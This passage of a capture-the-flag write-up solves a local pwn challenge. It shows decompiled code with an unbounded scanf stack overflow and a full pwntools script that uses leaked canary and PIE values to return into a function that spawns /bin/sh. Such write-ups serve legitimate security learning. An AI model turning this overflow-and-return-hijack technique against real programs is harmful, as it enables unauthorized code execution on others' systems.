Yep, it prints the address of the `print_title` function and the canary.

The program then reads our input.  
```c

void write_notes(void)

{
  long in_FS_OFFSET;
  undefined1 local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  cprintf(9,&DAT_00102528);
  cprintf(8,"You decide to record your thoughts in your treasure hunting journal.\n");
  cprintf(8,"Perhaps writing down the right sequence will lead you to the shell...\n\n");
  cprintf(3,"Write your notes: ");
  __isoc99_scanf(&DAT_00102613,local_58);
  cprintf(10,"\nYou finish writing and close your journal. Something feels different now...\n");
  cprintf(0xb,"Press Enter to continue...");
  getchar();
  getchar();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
There is a buffer overflow because scanf with `%s` does not limit input size, so we can write past `local_58` buffer.  
Set a breakpoint before the buffer overflow.

Our return address is at $rbp+8. `0x0000555555555994`, originally pointing to `main+222`. After we fill our 72 byte buffer, we need to overwrite our canary value and then the saved rbp value.  
Taking another look at what we can overwrite our return address to, we find a very usefull function.  
```c
void shell(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  system("/bin/sh");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Such a kind challenge, not only giving us free leaks but also a free shell.  
Finishing up our exploit.  
```python
payload = b'A'*72 + p64(canary) + b'A'*8 + p64(elf.sym.shell+5)
```
### Full Solve Script
```python
from pwn import *

context.binary = './pies_canaries_and_shells'
elf = context.binary
p = process(elf.path)
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
# gdb.attach(p)

p.sendlineafter(b'Press Enter to examine the papers...',b'')
p.recvuntil(b'Pie Location: ')
leak = int(p.recvline().strip().split(b' ')[0],16)
log.info(f'pie is {hex(leak)}')

p.recvuntil(b'Canary: ')
canary = int(p.recvline().strip().split(b' ')[0],16)
log.info(f'canary is {hex(canary)} {len(p64(canary))}')
# gdb.attach(p)
p.sendlineafter(b'Enter to continue your quest...',b'')

print_title = elf.sym['print_title']
base = leak - print_title
elf.address = base

payload = b'A'*72 + p64(canary) + b'A'*8 + p64(elf.sym.shell+5)
# p.sendlineafter(b'Write your notes: ',payload)
p.recvuntil(b'Write your notes: ')
p.sendline(payload)
p.interactive()
```
